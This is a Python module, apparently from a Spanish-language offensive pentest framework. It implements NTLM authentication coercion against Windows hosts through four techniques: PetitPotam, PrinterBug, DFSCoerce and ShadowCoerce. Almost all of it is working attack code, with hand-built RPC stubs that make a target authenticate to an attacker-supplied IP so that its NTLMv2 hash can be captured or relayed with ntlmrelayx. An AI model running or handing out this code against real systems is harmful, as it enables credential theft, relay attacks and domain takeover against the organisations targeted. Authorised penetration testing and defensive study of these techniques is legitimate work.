# scripts/smb/attack/ntlm_coerce.py
"""
Coerción NTLM — fuerza a un objetivo Windows a autenticarse contra
un servidor controlado por el atacante, capturando el hash NTLMv2
(o retransmitiéndolo con ntlmrelayx).

Técnicas disponibles:
  - petitpotam   — MS-EFSR EfsRpcOpenFileRaw / varios métodos RPC (CVE-2021-36942)
  - printerbug   — MS-RPRN SpoolSS (PrinterBug clásico)
  - dfscoerce    — MS-DFSNM NetrDfsRemoveStandaloneRoot
  - shadowcoerce — MS-FSRVP ShadowCopySetId

Uso:
  python lobera.py smb -t 10.10.10.5 --script=ntlm-coerce -u USER -p PASS --technique petitpotam --attacker-ip 10.10.10.99
  python lobera.py smb -t 10.10.10.5 --script=ntlm-coerce -u USER -p PASS --technique printerbug --attacker-ip 10.10.10.99
  python lobera.py smb -t 10.10.10.5 --script=ntlm-coerce --technique dfscoerce --attacker-ip 10.10.10.99
"""

from core.output import console
from core import session_db

import time


# ── Helpers RPC ────────────────────────────────────────────────────────────────

def _rpc_transport(target, user, password, domain, lm_hash, nt_hash, pipe):
    """Crea transporte SMB sobre named pipe."""
    from impacket.dcerpc.v5 import transport
    binding = transport.DCERPCTransportFactory(f"ncacn_np:{target}[\\pipe\\{pipe}]")
    binding.set_dport(445)
    if nt_hash:
        binding.set_credentials(user, "", domain, lm_hash, nt_hash)
    else:
        binding.set_credentials(user, password, domain)
    return binding


def _connect_dcerpc(binding, iface_uuid, iface_ver):
    """Conecta DCERPC y enlaza al interfaz dado."""
    from impacket.dcerpc.v5 import dcerpc
    dce = binding.get_dce_rpc()
    dce.connect()
    dce.bind(iface_uuid + iface_ver)
    return dce


# ── PetitPotam (MS-EFSR) ───────────────────────────────────────────────────────

def _petitpotam(target, user, password, domain, lm_hash, nt_hash, attacker_ip):
    """
    Coerción vía MS-EFSR (Encrypting File System Remote Protocol).
    Llama a EfsRpcOpenFileRaw apuntando al atacante.
    """
    console.print(f"  [bold]Técnica:[/bold] PetitPotam (MS-EFSR) → {attacker_ip}")

    # UUID del interfaz MS-EFSR
    EFSR_UUID    = "c681d488-d850-11d0-8c52-00c04fd90f7e"
    EFSR_VERSION = "\x01\x00"   # v1.0 — se formatea como bytes en la bind real

    try:
        from impacket.dcerpc.v5 import transport, epm
        from impacket.dcerpc.v5.rpcrt import DCERPCException
        import struct

        # Transporte vía lsarpc (compatible con hosts sin autenticación anon)
        pipes = ["lsarpc", "efsr", "samr", "netlogon", "srvsvc"]

        dce = None
        used_pipe = None

        for pipe in pipes:
            try:
                binding = _rpc_transport(target, user, password, domain,
                                         lm_hash, nt_hash, pipe)
                dce = binding.get_dce_rpc()
                dce.connect()
                # Bind a MS-EFSR
                dce.bind(
                    "c681d488-d850-11d0-8c52-00c04fd90f7e",
                    transfer_syntax=("8a885d04-1ceb-11c9-9fe8-08002b104860", "2.0")
                )
                used_pipe = pipe
                break
            except Exception:
                if dce:
                    try: dce.disconnect()
                    except Exception: pass
                dce = None

        if dce is None:
            console.print(f"  [red]✗ No se pudo conectar al interfaz MS-EFSR[/red]")
            return False

        console.print(f"  [dim]Conectado vía \\pipe\\{used_pipe}[/dim]")

        # Construir la llamada EfsRpcOpenFileRaw manualmente
        # opnum 0 = EfsRpcOpenFileRaw
        unc = f"\\\\{attacker_ip}\\share\\file.txt\x00".encode("utf-16-le")
        flags = 0

        # Marshalling manual: FileName (conformant varying string) + Flags
        stub  = b"\x00\x00\x00\x00"                 # context handle (NULL)
        stub += struct.pack("<I", len(unc) // 2)     # MaxCount
        stub += struct.pack("<I", 0)                  # Offset
        stub += struct.pack("<I", len(unc) // 2)     # ActualCount
        stub += unc
        if len(unc) % 4: stub += b"\x00" * (4 - len(unc) % 4)  # pad
        stub += struct.pack("<I", flags)

        try:
            dce.call(0, stub)
        except DCERPCException:
            pass   # Error esperado — la autenticación ya se disparó
        except Exception:
            pass

        dce.disconnect()
        console.print(f"  [green]✓ Coerción enviada — comprueba tu listener/ntlmrelayx en {attacker_ip}[/green]")
        return True

    except ImportError:
        console.print("  [red]✗ Falta impacket[/red]")
        return False
    except Exception as e:
        console.print(f"  [red]✗ Error: {e}[/red]")
        return False


# ── PrinterBug (MS-RPRN / SpoolSS) ────────────────────────────────────────────

def _printerbug(target, user, password, domain, lm_hash, nt_hash, attacker_ip):
    """
    Coerción vía MS-RPRN RpcRemoteFindFirstPrinterChangeNotificationEx.
    Requiere que el servicio Spooler esté activo.
    """
    console.print(f"  [bold]Técnica:[/bold] PrinterBug (MS-RPRN / SpoolSS) → {attacker_ip}")

    try:
        from impacket.dcerpc.v5 import transport, rprn
        from impacket.dcerpc.v5.rpcrt import DCERPCException

        binding = _rpc_transport(target, user, password, domain,
                                  lm_hash, nt_hash, "spoolss")
        dce = binding.get_dce_rpc()
        dce.connect()
        dce.bind(rprn.MSRPC_UUID_RPRN)

        console.print(f"  [dim]Conectado a \\pipe\\spoolss[/dim]")

        # Obtener handle del servidor de impresión
        resp = rprn.hRpcOpenPrinter(dce, f"\\\\{target}\x00")
        printer_handle = resp["pHandle"]

        # Disparar la autenticación hacia el atacante
        attacker_unc = f"\\\\{attacker_ip}\x00"
        try:
            rprn.hRpcRemoteFindFirstPrinterChangeNotificationEx(
                dce,
                printer_handle,
                rprn.PRINTER_CHANGE_ADD_JOB,
                pszLocalMachine=attacker_unc,
            )
        except DCERPCException:
            pass   # Error esperado

        dce.disconnect()
        console.print(f"  [green]✓ Coerción enviada — comprueba tu listener/ntlmrelayx en {attacker_ip}[/green]")
        return True

    except ImportError:
        console.print("  [red]✗ Falta impacket[/red]")
        return False
    except Exception as e:
        console.print(f"  [red]✗ Error (¿Spooler activo?): {e}[/red]")
        return False


# ── DFSCoerce (MS-DFSNM) ──────────────────────────────────────────────────────

def _dfscoerce(target, user, password, domain, lm_hash, nt_hash, attacker_ip):
    """
    Coerción vía MS-DFSNM NetrDfsRemoveStandaloneRoot.
    Funciona sin autenticación en algunos entornos.
    """
    console.print(f"  [bold]Técnica:[/bold] DFSCoerce (MS-DFSNM) → {attacker_ip}")

    # UUID MS-DFSNM
    DFSNM_UUID = "4fc742e0-4a10-11cf-8273-00aa004ae673"

    try:
        from impacket.dcerpc.v5 import transport
        from impacket.dcerpc.v5.rpcrt import DCERPCException
        import struct

        binding = _rpc_transport(target, user, password, domain,
                                  lm_hash, nt_hash, "netdfs")
        dce = binding.get_dce_rpc()
        dce.connect()
        dce.bind(
            DFSNM_UUID,
            transfer_syntax=("8a885d04-1ceb-11c9-9fe8-08002b104860", "2.0")
        )

        console.print(f"  [dim]Conectado vía \\pipe\\netdfs[/dim]")

        # NetrDfsRemoveStandaloneRoot(ServerName, RootShare, ApiFlags)
        server  = f"\\\\{attacker_ip}\x00".encode("utf-16-le")
        root    = f"\\\\{target}\\share\x00".encode("utf-16-le")

        def _wstr(s):
            return (struct.pack("<I", len(s) // 2) +
                    struct.pack("<I", 0) +
                    struct.pack("<I", len(s) // 2) + s +
                    (b"\x00" * ((4 - len(s) % 4) % 4)))

        stub  = _wstr(server)
        stub += _wstr(root)
        stub += struct.pack("<I", 0)   # ApiFlags

        try:
            dce.call(13, stub)         # opnum 13 = NetrDfsRemoveStandaloneRoot
        except DCERPCException:
            pass

        dce.disconnect()
        console.print(f"  [green]✓ Coerción enviada — comprueba tu listener/ntlmrelayx en {attacker_ip}[/green]")
        return True

    except Exception as e:
        console.print(f"  [red]✗ Error: {e}[/red]")
        return False


# ── ShadowCoerce (MS-FSRVP) ───────────────────────────────────────────────────

def _shadowcoerce(target, user, password, domain, lm_hash, nt_hash, attacker_ip):
    """
    Coerción vía MS-FSRVP IsPathSupported / IsPathShadowCopied.
    """
    console.print(f"  [bold]Técnica:[/bold] ShadowCoerce (MS-FSRVP) → {attacker_ip}")

    FSRVP_UUID = "a8e0653c-2744-4389-a61d-7373df8b2292"

    try:
        from impacket.dcerpc.v5 import transport
        from impacket.dcerpc.v5.rpcrt import DCERPCException
        import struct

        binding = _rpc_transport(target, user, password, domain,
                                  lm_hash, nt_hash, "FssagentRpc")
        dce = binding.get_dce_rpc()
        dce.connect()
        dce.bind(
            FSRVP_UUID,
            transfer_syntax=("8a885d04-1ceb-11c9-9fe8-08002b104860", "2.0")
        )

        console.print(f"  [dim]Conectado vía \\pipe\\FssagentRpc[/dim]")

        share_unc = f"\\\\{attacker_ip}\\share\x00".encode("utf-16-le")

        def _wstr(s):
            return (struct.pack("<I", len(s) // 2) +
                    struct.pack("<I", 0) +
                    struct.pack("<I", len(s) // 2) + s +
                    (b"\x00" * ((4 - len(s) % 4) % 4)))

        stub = _wstr(share_unc)

        try:
            dce.call(9, stub)   # opnum 9 = IsPathSupported
        except DCERPCException:
            pass

        dce.disconnect()
        console.print(f"  [green]✓ Coerción enviada — comprueba tu listener/ntlmrelayx en {attacker_ip}[/green]")
        return True

    except Exception as e:
        console.print(f"  [red]✗ Error: {e}[/red]")
        return False


# ── Script principal ───────────────────────────────────────────────────────────

class Script:
    NAME        = "ntlm-coerce"
    DESCRIPTION = "Coerción NTLM: PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce"

    def __init__(self, target, creds):
        self.target = target
        self.creds  = creds

    def run(self, args):
        target      = str(self.target.ip)
        user        = getattr(args, "user",        None) or (self.creds.username if self.creds else None)
        password    = getattr(args, "password",    "") or (self.creds.password if self.creds else "")
        domain      = getattr(args, "domain",      "") or (self.creds.domain if self.creds else "")
        hash_       = getattr(args, "hash",        None)
        technique   = getattr(args, "technique",   "petitpotam") or "petitpotam"
        attacker_ip = getattr(args, "attacker_ip", None)

        if not attacker_ip:
            console.print("[red]Falta --attacker-ip <IP del atacante>[/red]")
            console.print("[dim]Asegúrate de tener ntlmrelayx o Responder escuchando ahí[/dim]")
            return

        lm_hash = nt_hash = ""
        if hash_:
            parts   = hash_.split(":")
            lm_hash = parts[0] if len(parts) > 1 else "aad3b435b51404eeaad3b435b51404ee"
            nt_hash = parts[-1]

        # petitpotam puede usarse sin credenciales en ciertos entornos
        if not user and technique not in ("petitpotam", "dfscoerce"):
            console.print("[red]Falta -u USER[/red]")
            return

        console.print(f"  [bold]Coerción NTLM[/bold] → {target}  técnica: {technique}")
        console.print(f"  [dim]Listener del atacante: {attacker_ip}[/dim]\n")

        tech_map = {
            "petitpotam":   _petitpotam,
            "printerbug":   _printerbug,
            "dfscoerce":    _dfscoerce,
            "shadowcoerce": _shadowcoerce,
        }

        fn = tech_map.get(technique)
        if fn is None:
            console.print(f"  [yellow]Técnicas disponibles:[/yellow] petitpotam | printerbug | dfscoerce | shadowcoerce")
            return

        success = fn(target, user or "", password, domain, lm_hash, nt_hash, attacker_ip)

        if success:
            session_db.save_finding(
                category="ntlm-coerce",
                data={
                    "target":      target,
                    "technique":   technique,
                    "attacker_ip": attacker_ip,
                }
            )
